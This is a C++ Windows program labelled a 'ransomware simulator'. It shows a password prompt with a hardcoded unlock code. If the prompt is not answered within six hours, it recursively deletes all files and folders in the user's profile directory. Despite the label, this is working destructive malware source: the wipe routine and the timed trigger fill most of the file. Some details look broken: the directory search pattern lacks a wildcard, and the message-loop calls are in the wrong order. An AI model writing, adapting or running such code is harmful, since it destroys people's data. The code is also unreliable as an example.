#include <windows.h>
#include <stdio.h>
#include <string.h>

/* * Technical implementation: qwe.exe - Ransomware simulator.
 * Compiled with: g++ qwe.cpp -o qwe.exe -luser32 -lgdi32 -mwindows
 */

const char* PASSWORD = "676767";

void wipe_files(const char* path) {
    char search_path[MAX_PATH];
    sprintf(search_path, "%s\\.", path);
    WIN32_FIND_DATA fd;
    HANDLE hFind = FindFirstFile(search_path, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0) {
                char full_path[MAX_PATH];
                sprintf(full_path, "%s\\%s", path, fd.cFileName);
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    wipe_files(full_path);
                    RemoveDirectory(full_path);
                } else {
                    DeleteFile(full_path);
                }
            }
        } while (FindNextFile(hFind, &fd));
        FindClose(hFind);
    }
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    static HWND hEdit;
    if (uMsg == WM_CREATE) {
        hEdit = CreateWindow("EDIT", "", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                             50, 50, 200, 25, hwnd, NULL, NULL, NULL);
        CreateWindow("BUTTON", "Submit", WS_CHILD | WS_VISIBLE, 50, 80, 100, 30, hwnd, (HMENU)1, NULL, NULL);
    } else if (uMsg == WM_COMMAND && LOWORD(wParam) == 1) {
        char buffer[256];
        GetWindowText(hEdit, buffer, 256);
        if (strcmp(buffer, PASSWORD) == 0) {
            MessageBox(hwnd, "Unlocked.", "Status", MB_OK);
            PostQuitMessage(0);
        } else {
            MessageBox(hwnd, "Incorrect.", "Error", MB_OK);
        }
    } else if (uMsg == WM_DESTROY) {
        PostQuitMessage(0);
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int main() {
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "RansomClass";
    RegisterClass(&wc);

    HWND hwnd = CreateWindow("RansomClass", "Enter Password", WS_OVERLAPPEDWINDOW, 100, 100, 350, 200, NULL, NULL, wc.hInstance, NULL);
    ShowWindow(hwnd, SW_SHOW);

    MSG msg;
    DWORD start_time = GetTickCount();
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (GetTickCount() - start_time > 21600000) { // 6 hours in ms
            char path[MAX_PATH];
            GetEnvironmentVariable("USERPROFILE", path, MAX_PATH);
            wipe_files(path);
            ExitProcess(0);
        }
        DispatchMessage(&msg);
        TranslateMessage(&msg);
    }
    return 0;
}
